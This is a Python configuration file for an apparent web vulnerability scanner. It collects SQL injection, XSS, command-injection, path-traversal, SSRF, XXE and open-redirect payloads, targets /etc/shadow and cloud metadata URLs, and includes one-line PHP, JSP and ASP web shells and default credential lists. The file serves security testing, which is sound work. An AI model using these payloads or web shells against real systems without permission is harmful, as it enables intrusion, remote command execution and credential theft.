#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
增强版配置文件 - 支持更灵活的配置管理
"""

import os
from typing import Dict, List, Any, Optional


# ==================== HTTP请求配置 ====================
HTTP_CONFIG = {
    'timeout': 15,  # 默认超时时间(秒)
    'max_retries': 3,  # 最大重试次数
    'retry_backoff': 1.5,  # 重试退避因子
    'user_agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'default_headers': {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8,en-US;q=0.7',
        'Accept-Encoding': 'gzip, deflate, br',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
    },
    # 代理配置
    'proxy': {
        'enabled': False,
        'http': 'http://127.0.0.1:8080',
        'https': 'http://127.0.0.1:8080',
    },
    # 速率限制配置
    'rate_limit': {
        'requests_per_second': 10,  # 每秒最大请求数
        'burst_size': 20,  # 突发请求大小
        'delay_between_requests': 0.1,  # 请求间隔(秒)
    }
}


# ==================== 异步并发配置 ====================
ASYNC_CONFIG = {
    'max_workers': 20,  # 默认最大工作线程/协程数
    'semaphore_limit': 50,  # 并发信号量限制
    'connection_pool_size': 100,  # 连接池大小
    'max_conn_per_host': 10,  # 每个主机的最大连接数
    'use_async': True,  # 是否使用异步模式(默认True)
}


# ==================== 爬虫配置 ====================
CRAWLER_CONFIG = {
    'max_pages': 200,  # 最大爬取页面数
    'max_depth': 5,  # 最大爬取深度
    'same_domain': True,  # 是否只爬取同域名
    'respect_robots_txt': True,  # 是否遵守robots.txt
    'parse_javascript': True,  # 是否解析JS渲染的页面
    'extract_api_endpoints': True,  # 是否提取API端点
    'parse_sitemap': True,  # 是否解析sitemap.xml
    'follow_redirects': True,  # 是否跟随重定向
    'max_redirects': 5,  # 最大重定向次数
    # 静态文件排除列表
    'static_extensions': [
        '.jpg', '.jpeg', '.png', '.gif', '.bmp', '.svg', '.ico',
        '.css', '.js', '.woff', '.woff2', '.ttf', '.eot',
        '.mp3', '.mp4', '.avi', '.mov', '.flv', '.webm',
        '.pdf', '.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx',
        '.zip', '.rar', '.tar', '.gz', '.7z',
    ],
    # Playwright配置(用于JS渲染)
    'playwright': {
        'headless': True,
        'timeout': 30000,  # 页面加载超时(毫秒)
        'wait_until': 'networkidle',  # 等待策略
        'viewport': {'width': 1920, 'height': 1080},
    }
}


# ==================== 认证配置 ====================
AUTH_CONFIG = {
    # 自动登录配置
    'auto_login': {
        'enabled': False,
        'login_url': '',
        'username_field': 'username',
        'password_field': 'password',
        'credentials': {
            'username': '',
            'password': '',
        },
        'success_indicators': ['logout', 'dashboard', 'welcome', 'profile'],  # 登录成功标识
        'failure_indicators': ['invalid', 'incorrect', 'failed', 'error'],  # 登录失败标识
    },
    # Token刷新配置
    'token_refresh': {
        'enabled': False,
        'refresh_url': '',
        'refresh_interval': 300,  # 刷新间隔(秒)
        'token_field': 'access_token',
        'refresh_token_field': 'refresh_token',
    },
    # OAuth2配置
    'oauth2': {
        'enabled': False,
        'client_id': '',
        'client_secret': '',
        'token_url': '',
        'scope': '',
    },
    # Session配置
    'session': {
        'keep_alive': True,
        'cookie_persistence': True,
        'session_timeout': 3600,  # 会话超时时间(秒)
    }
}


# ==================== 插件配置 ====================
PLUGIN_CONFIG = {
    'plugin_dir': 'plugins',  # 插件目录
    'auto_discover': True,  # 自动发现插件
    'enabled_plugins': [],  # 启用的插件列表(空表示全部启用)
    'disabled_plugins': [],  # 禁用的插件列表
}


# ==================== 漏洞检测配置 ====================
VULN_CONFIG = {
    # SQL注入检测配置
    'sqli': {
        'enabled': True,
        'priority': 1,
        'payloads': [
            "' OR '1'='1",
            "' OR 1=1 --",
            "\" OR \"1\"=\"1",
            "\" OR 1=1 --",
            "OR 1=1 --",
            "' AND 1=1 UNION SELECT NULL,NULL,NULL --",
            "' AND 1=2 UNION SELECT 1,2,3 --",
            "' AND (SELECT COUNT(*) FROM users) > 0 --",
            "'; EXEC xp_cmdshell('whoami') --",
            "' UNION SELECT username,password,NULL FROM users --",
        ],
        'error_patterns': [
            'MySQL syntax',
            'PostgreSQL syntax',
            'SQL syntax',
            'Microsoft SQL Server',
            'MariaDB server',
            'ORA-',
            'sqlite_master',
            'syntax error',
            'database error',
            'unclosed quotation mark',
            'SQLSTATE',
            'PDOException',
        ],
        'boolean_payloads': [
            ("' AND '1'='1", "' AND '1'='2"),
            ("' OR 1=1 --", "' OR 1=2 --"),
            ('" AND "1"="1', '" AND "1"="2'),
            ("1 AND 1=1", "1 AND 1=2"),
        ],
        'time_payloads': [
            "' AND SLEEP(5) --",
            "' AND SLEEP(0) --",
            "'; WAITFOR DELAY '00:00:05' --",
            "'; WAITFOR DELAY '00:00:00' --",
            "' AND pg_sleep(5) --",
            "' AND 1=1 AND SLEEP(5) --",
            "' AND (SELECT SLEEP(5)) --",
        ],
        'time_threshold': 4.0,  # 时间盲注阈值(秒)
    },
    
    # XSS检测配置
    'xss': {
        'enabled': True,
        'priority': 2,
        'payloads': [
            '<script>alert("XSS")</script>',
            '<img src=x onerror=alert("XSS")>',
            '<svg onload=alert("XSS")>',
            '<body onload=alert("XSS")>',
            '<iframe src="javascript:alert(\'XSS\')">',
            '<input onfocus=alert("XSS") autofocus>',
            '<marquee onstart=alert("XSS")>',
            '<details ontoggle=alert("XSS")>',
            '"><script>alert("XSS")</script>',
            "'><script>alert(\"XSS\")</script>",
            '<script>console.log("XSS")</script>',
            'javascript:alert("XSS")',
            '<object data="javascript:alert(\'XSS\')">',
            '<embed src="javascript:alert(\'XSS\')">',
        ],
        'detection_methods': [
            'reflection',  # 反射检测
            'dom_analysis',  # DOM分析
            'context_analysis',  # 上下文分析
        ],
    },
    
    # CSRF检测配置
    'csrf': {
        'enabled': True,
        'priority': 3,
        'token_patterns': [
            'csrf',
            'token',
            '_token',
            'authenticity_token',
            'csrfmiddlewaretoken',
            'xsrf',
            '_xsrf',
            'csrf_token',
        ],
    },
    
    # 目录遍历检测配置
    'directory_traversal': {
        'enabled': True,
        'priority': 4,
        'payloads': [
            '../',
            '../../',
            '../../../',
            '../../../../',
            '../../../../../',
            '%2e%2e%2f',
            '%2e%2e%5c',
            '..%2f',
            '..%5c',
            '....//',
            '....\\',
            '%252e%252e%252f',
        ],
        'test_files': [
            'etc/passwd',
            'etc/shadow',
            'windows/win.ini',
            'windows/system32/drivers/etc/hosts',
            'boot.ini',
            'etc/hosts',
            'proc/self/environ',
        ],
    },
    
    # 敏感文件检测配置
    'sensitive_files': {
        'enabled': True,
        'priority': 5,
        'files': [
            'robots.txt',
            'sitemap.xml',
            '.htaccess',
            '.htpasswd',
            '.git/config',
            '.git/HEAD',
            '.svn/entries',
            '.env',
            'backup/',
            'backup.zip',
            'backup.tar.gz',
            'backup.sql',
            'config.php',
            'config.ini',
            'config.yml',
            'config.json',
            'web.config',
            'database.sql',
            'dump.sql',
            'README.md',
            'README.txt',
            'CHANGELOG.md',
            'LICENSE',
            'phpinfo.php',
            'info.php',
            'test.php',
            'admin/',
            'phpmyadmin/',
            'wp-admin/',
            'wp-config.php',
            '.DS_Store',
            'Thumbs.db',
        ],
    },
    
    # 命令注入检测配置
    'command_injection': {
        'enabled': True,
        'priority': 6,
        'payloads': [
            '| whoami',
            '; whoami',
            '&& whoami',
            '| id',
            '; id',
            '| ls -la',
            '; ls -la',
            '| dir',
            '; dir',
            '`whoami`',
            '$(whoami)',
            '| nslookup',
            '; ping 127.0.0.1',
        ],
        'detection_patterns': [
            'root:',
            'uid=',
            'gid=',
            'total',
            'Directory of',
            'bytes free',
        ],
    },
    
    # SSRF检测配置
    'ssrf': {
        'enabled': True,
        'priority': 7,
        'payloads': [
            'http://127.0.0.1',
            'http://localhost',
            'http://0.0.0.0',
            'http://[::1]',
            'http://169.254.169.254/latest/meta-data/',  # AWS元数据
            'http://100.100.100.200/latest/meta-data/',  # 阿里云元数据
            'file:///etc/passwd',
            'gopher://127.0.0.1/',
            'dict://127.0.0.1/',
        ],
        'internal_ip_ranges': [
            '10.0.0.0/8',
            '172.16.0.0/12',
            '192.168.0.0/16',
            '127.0.0.0/8',
            '169.254.0.0/16',
        ],
    },
    
    # 文件上传检测配置
    'file_upload': {
        'enabled': True,
        'priority': 8,
        'malicious_files': [
            {'name': 'shell.php', 'content': '<?php system($_GET["cmd"]); ?>', 'mime': 'application/x-php'},
            {'name': 'shell.jsp', 'content': '<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>', 'mime': 'application/octet-stream'},
            {'name': 'shell.asp', 'content': '<% eval request("cmd") %>', 'mime': 'application/octet-stream'},
            {'name': 'shell.html', 'content': '<script>document.write("test")</script>', 'mime': 'text/html'},
            {'name': 'test.jpg.php', 'content': '<?php echo "test"; ?>', 'mime': 'image/jpeg'},
        ],
        'bypass_techniques': [
            'double_extension',  # 双扩展名
            'case_manipulation',  # 大小写变换
            'null_byte',  # 空字节
            'mime_manipulation',  # MIME类型操纵
        ],
    },
    
    # CORS检测配置
    'cors': {
        'enabled': True,
        'priority': 9,
        'test_origins': [
            'https://evil.com',
            'http://evil.com',
            'null',
            'https://attacker.com',
        ],
    },
    
    # 安全头检测配置
    'security_headers': {
        'enabled': True,
        'priority': 10,
        'required_headers': [
            'Strict-Transport-Security',
            'Content-Security-Policy',
            'X-Content-Type-Options',
            'X-Frame-Options',
            'X-XSS-Protection',
            'Referrer-Policy',
            'Permissions-Policy',
            'Cache-Control',
            'Pragma',
        ],
    },
    
    # 弱密码检测配置
    'weak_password': {
        'enabled': True,
        'priority': 11,
        'common_passwords': [
            'admin',
            'password',
            '123456',
            '12345678',
            'admin123',
            'root',
            'toor',
            'test',
            'guest',
            'default',
        ],
        'username_list': [
            'admin',
            'administrator',
            'root',
            'test',
            'user',
            'guest',
            'webmaster',
        ],
    },
    
    # 新增: XXE检测配置
    'xxe': {
        'enabled': True,
        'priority': 12,
        'payloads': [
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>',
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///windows/win.ini">]><root>&test;</root>',
            '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY file SYSTEM "http://evil.com">]><data>&file;</data>',
        ],
    },
    
    # 新增: 开放重定向检测配置
    'open_redirect': {
        'enabled': True,
        'priority': 13,
        'payloads': [
            'http://evil.com',
            '//evil.com',
            '///evil.com',
            'http://localhost.evil.com',
            '%40evil.com',
            '/\\evil.com',
        ],
        'redirect_params': ['url', 'redirect', 'redirect_to', 'next', 'return', 'returnto', 'dest', 'destination'],
    },
}


# ==================== 报告配置 ====================
REPORT_CONFIG = {
    'output_dir': 'reports',
    'formats': ['html', 'json', 'csv', 'pdf'],
    'default_format': 'html',
    'include_screenshots': True,  # 是否包含截图
    'include_request_response': True,  # 是否包含请求/响应详情
    'max_evidence_length': 5000,  # 证据最大长度
    'template': 'modern',  # 报告模板: modern, classic, minimal
}


# ==================== 日志配置 ====================
LOG_CONFIG = {
    'level': 'INFO',  # DEBUG, INFO, WARNING, ERROR, CRITICAL
    'format': '%(asctime)s [%(levelname)s] %(name)s: %(message)s',
    'date_format': '%Y-%m-%d %H:%M:%S',
    'file_logging': True,
    'console_logging': True,
    'log_file': 'scanner.log',
    'max_bytes': 10 * 1024 * 1024,  # 10MB
    'backup_count': 3,
}


# ==================== 扫描配置 ====================
SCAN_CONFIG = {
    'threads': 10,  # 默认线程数(同步模式)
    'max_pages': 200,  # 最大爬取页面数
    'delay': 0.1,  # 请求延迟(秒)
    'timeout': 15,  # 请求超时(秒)
    'enable_crawler': True,  # 是否启用爬虫
    'enable_api_scan': True,  # 是否启用API扫描
    'deep_scan': False,  # 是否启用深度扫描
}
